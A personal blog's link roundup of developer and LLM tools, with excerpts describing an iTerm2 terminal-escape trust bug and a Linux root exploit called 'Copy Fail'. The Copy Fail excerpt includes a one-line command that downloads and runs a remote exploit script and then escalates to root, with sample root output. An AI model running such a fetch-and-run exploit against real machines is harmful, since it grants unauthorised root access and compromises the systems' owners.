---
title: "Articles"
date: 2026-04-30T11:46:57+08:00
menu:
  sidebar:
    name: "Articles"
    identifier: articles-recent-20260430
    weight: 10
tags: ["Links", "LLM", "Skill", "Markdown", "Ada", "Virtual Machine", "Linux"]
categories:
  ["Links", "LLM", "Skill", "Markdown", "Ada", "Virtual Machine", "Linux"]
---

- [gstack: Use Garry Tan's exact Claude Code setup: 23 opinionated tools that serve as CEO, Designer, Eng Manager, Release Manager, Doc Engineer, and QA](https://github.com/garrytan/gstack)
- [Waza: Engineering habits you already know, turned into skills Claude can run.](https://github.com/tw93/waza)
- [docmd: Build production-ready documentation from Markdown in seconds.](https://github.com/docmd-io/docmd)
- [talk-normal: Make any LLM talk like a normal person. A system prompt that removes AI slop.](https://github.com/hexiecs/talk-normal)
- [The Quiet Colossus](https://www.iqiipi.com/the-quiet-colossus.html)
- [smolvm: Tool to build & run portable, lightweight, self-contained virtual machines.](https://github.com/smol-machines/smolvm)
- [MAD Bugs: "cat readme.txt" is not safe in iTerm2](https://blog.calif.io/p/mad-bugs-even-cat-readmetxt-is-not)
- [https://aistupidlevel.info/](https://aistupidlevel.info/)
- [https://markdown.new/](https://markdown.new/)
- [caveman: Claude Code skill that cuts 65% of tokens by talking like caveman](https://github.com/JuliusBrussee/caveman)
- [trellis-mac: This is a port of Microsoft's TRELLIS.2 — a state-of-the-art image-to-3D model — from CUDA-only to Apple Silicon via PyTorch MPS. No NVIDIA GPU required.](https://github.com/shivampkumar/trellis-mac)
- [ggsql: A grammar of graphics for SQL](https://opensource.posit.co/blog/2026-04-20_ggsql_alpha_release/)
- [https://lawsofsoftwareengineering.com/](https://lawsofsoftwareengineering.com/)
- [VidStudio: a browser based video editor that doesn't upload your files](https://vidstudio.app/video-editor)
- [cal.diy: Scheduling infrastructure for absolutely everyone.](https://github.com/calcom/cal.diy)
- [RustTraining](https://github.com/microsoft/RustTraining)
- [opendoas: A portable fork of the OpenBSD `doas` command, is a minimal replacement for the venerable `sudo`.](https://github.com/duncaen/opendoas)
- [compressO: Convert any video/image into a tiny size. 100% free & open-source. Available for Mac, Windows & Linux.](https://github.com/codeforreal1/compressO)
- [kami: Part of a trilogy: Kaku (書く) writes code, Waza (技) drills habits, Kami (紙) delivers documents.](https://github.com/tw93/kami)
- [design-md-chrome: Chrome extension to extract styles from any website and generate DESIGN.md files and design skills for AI based on TypeUI](https://github.com/bergside/design-md-chrome)
- [佐enter 成人碎牛皮手套](https://www.a-nan53.tw/product/enter-adult-baseball-cowhide-glove/)
- [localsend: An open-source cross-platform alternative to AirDrop](https://github.com/localsend/localsend)
- [GTFOBins is a curated list of Unix-like executables that can be used to bypass local security restrictions in misconfigured systems.](https://gtfobins.org)
- [Warp is an agentic development environment, born out of the terminal.](https://github.com/warpdotdev/warp)
- [Just the Browser: Remove AI features, telemetry data reporting, sponsored content, product integrations, and other annoyances from web browsers.](https://github.com/corbindavenport/just-the-browser)
- [Copy Fail: CVE-2026-31431](https://copy.fail/)

---

## MAD Bugs: "cat readme.txt" is not safe in iTerm2

### The core bug

The bug is a trust failure. iTerm2 accepts the SSH conductor protocol from terminal output that is not actually coming from a trusted, real conductor session. In other words, untrusted terminal output can impersonate the remote conductor.

That means a malicious file, server response, banner, or MOTD can print:

- a forged DCS 2000p hook
- forged OSC 135 replies

and iTerm2 will start acting like it is in the middle of a real SSH integration exchange. That is the exploit primitive.

### What the exploit is really doing

`cat readme.txt`

Once the hook is accepted, iTerm2 starts its normal conductor workflow. In upstream source, `Conductor.start()` immediately sends `getshell()`, and after that succeeds it sends `pythonversion()`.

So the exploit does not need to inject those requests. iTerm2 issues them itself, and the malicious output only has to impersonate the replies.

---

## Copy Fail

Most Linux LPEs need a race window or a kernel-specific offset.
Copy Fail is a straight-line logic flaw — it needs neither.
The same 732-byte Python script roots every Linux distribution shipped since 2017.

Standalone PoC. Python 3.10+ stdlib only (`os`, `socket`, `zlib`).
Targets `/usr/bin/su` by default; pass another setuid binary as `argv[1]`.

Github: https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py

Quick run:

```shell
curl https://copy.fail/exp | python3 && su
id
uid=0(root) gid=1002(user) groups=1002(user)
```

Issue tracker: https://github.com/theori-io/copy-fail-CVE-2026-31431
